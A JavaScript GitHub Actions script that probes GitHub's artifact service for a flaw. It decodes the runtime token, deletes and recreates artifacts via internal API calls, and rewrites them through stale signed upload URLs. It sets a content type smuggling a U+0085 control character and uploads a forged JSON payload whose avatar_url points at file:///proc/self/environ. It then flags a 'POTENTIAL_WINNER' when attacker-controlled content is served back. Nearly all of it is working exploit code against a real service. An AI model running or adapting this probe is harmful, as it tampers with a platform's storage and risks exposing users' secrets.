const crypto = require('node:crypto');

module.exports = async function scan({context}) {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString());
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, workflowRunBackendId, workflowJobRunBackendId] = scope.split(':');
  const ids = {workflow_run_backend_id: workflowRunBackendId, workflow_job_run_backend_id: workflowJobRunBackendId};
  const endpoint = `${new URL(process.env.ACTIONS_RESULTS_URL).origin}/twirp/github.actions.results.api.v1.ArtifactService/`;
  const repo = `${context.repo.owner}/${context.repo.repo}`;
  const weird = '\u0085application/json';

  async function twirp(method, body) {
    const response = await fetch(endpoint + method, {
      method: 'POST',
      headers: {Authorization: `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'},
      body: JSON.stringify(body),
    });
    return {status: response.status, data: await response.json().catch(() => ({}))};
  }
  async function put(url, body, type) {
    const response = await fetch(url, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/octet-stream',
        'x-ms-version': '2025-01-05',
        'x-ms-blob-type': 'BlockBlob',
        'x-ms-blob-content-type': type,
      },
      body,
    });
    return response.status;
  }
  const desired = id => Buffer.from(JSON.stringify({
    full_name: `${repo}/actions/artifacts/${id}/zip`,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette probe', stargazers_count: 0,
  }));
  async function inspect(id, expected) {
    const response = await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`, {
      redirect: 'manual',
      headers: {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github+json'},
    });
    const location = response.headers.get('location');
    if (!location) return {id, rest: response.status};
    const rsct = new URL(location).searchParams.get('rsct');
    const download = await fetch(location);
    const bytes = Buffer.from(await download.arrayBuffer());
    return {
      id, rest: response.status, rsct, finalStatus: download.status,
      finalContentType: download.headers.get('content-type'),
      byteLength: bytes.length,
      rawExact: bytes.equals(expected),
      bodySha256: crypto.createHash('sha256').update(bytes).digest('hex'),
      bodyPrefix: bytes.subarray(0, 64).toString('hex'),
    };
  }
  async function inspectRestQueries(id) {
    const queries = ['', '?apiVersion=2018-07-01', '?api-version=2018-07-01', '?apiVersion=2022-11-28', '?api-version=2022-11-28', '?version=6'];
    const results = [];
    for (const query of queries) {
      const response = await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip${query}`, {
        redirect: 'manual',
        headers: {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github+json'},
      });
      const location = response.headers.get('location');
      results.push({query, status: response.status, rsct: location ? new URL(location).searchParams.get('rsct') : null});
    }
    return results;
  }
  async function create(name, version, mime, body) {
    const response = await twirp('CreateArtifact', {...ids, name, version, mime_type: mime});
    const url = response.data.signed_upload_url || response.data.signedUploadUrl;
    if (response.status !== 200 || !response.data.ok || !url)
      return {createStatus: response.status, createOk: response.data.ok, createMessage: String(response.data.msg || '').slice(0, 120)};
    const putStatus = await put(url, body, mime);
    if (putStatus !== 201) return {createStatus: response.status, putStatus};
    const hash = `sha256:${crypto.createHash('sha256').update(body).digest('hex')}`;
    const finalized = await twirp('FinalizeArtifact', {...ids, name, size: String(body.length), hash});
    const id = String(finalized.data.artifact_id || finalized.data.artifactId || '');
    return {createStatus: response.status, putStatus, finalizeStatus: finalized.status, finalizeOk: finalized.data.ok, id, url};
  }
  const cases = [
    {label: 'old-v6-new-v7', first: [6, weird], second: [7, 'application/json']},
    {label: 'old-v7-new-v6', first: [7, 'application/json'], second: [6, weird]},
  ];
  for (const c of cases) {
    const name = `cassette-delete-${context.runId}-${c.label}`;
    try {
      const firstBody = Buffer.from(JSON.stringify({phase: 'old', case: c.label}));
      const first = await create(name, ...c.first, firstBody);
      if (!first.id) {
        console.log(JSON.stringify({case: c.label, stage: 'first-create', result: first}));
        continue;
      }
      const before = await inspect(first.id, firstBody);
      const oldQueryResults = await inspectRestQueries(first.id);
      const deleted = await twirp('DeleteArtifact', {...ids, name});
      if (deleted.status !== 200 || !deleted.data.ok) {
        console.log(JSON.stringify({case: c.label, stage: 'delete', oldId: first.id, before, deleteStatus: deleted.status, deleteOk: deleted.data.ok, deleteMessage: String(deleted.data.msg || '').slice(0, 120)}));
        continue;
      }
      let second;
      for (let attempt = 0; attempt < 4; attempt++) {
        second = await create(name, ...c.second, Buffer.from(JSON.stringify({phase: 'new', case: c.label})));
        if (second.id) break;
        await new Promise(resolve => setTimeout(resolve, (attempt + 1) * 1000));
      }
      if (!second.id) {
        console.log(JSON.stringify({case: c.label, stage: 'second-create', oldId: first.id, before, deleteStatus: deleted.status, second: {createStatus: second.createStatus, createOk: second.createOk, createMessage: second.createMessage}}));
        continue;
      }
      const oldPath = new URL(first.url);
      const newPath = new URL(second.url);
      const sameBlobPath = oldPath.origin === newPath.origin && oldPath.pathname === newPath.pathname;
      const newBody = desired(second.id);
      const oldUrlPut = await put(first.url, newBody, weird);
      const afterOldUrl = await inspect(second.id, newBody);
      const newUrlPut = await put(second.url, newBody, weird);
      const afterNewUrl = await inspect(second.id, newBody);
      const newQueryResults = await inspectRestQueries(second.id);
      const report = {
        case: c.label, oldId: first.id, newId: second.id, before,
        deleteStatus: deleted.status, deleteOk: deleted.data.ok,
        sameBlobPath, oldUrlPut, afterOldUrl, newUrlPut, afterNewUrl,
        oldQueryResults, newQueryResults,
      };
      console.log(JSON.stringify(report));
      if (afterOldUrl.rawExact && afterOldUrl.finalContentType?.includes('\u0085') ||
          afterNewUrl.rawExact && afterNewUrl.finalContentType?.includes('\u0085')) {
        console.log(`POTENTIAL_WINNER ${JSON.stringify({id: second.id, case: c.label, repository: `${repo}/actions/artifacts/${second.id}/zip`, report})}`);
        return;
      }
    } catch (error) {
      console.log(JSON.stringify({case: c.label, error: String(error).slice(0, 220)}));
    }
  }
};
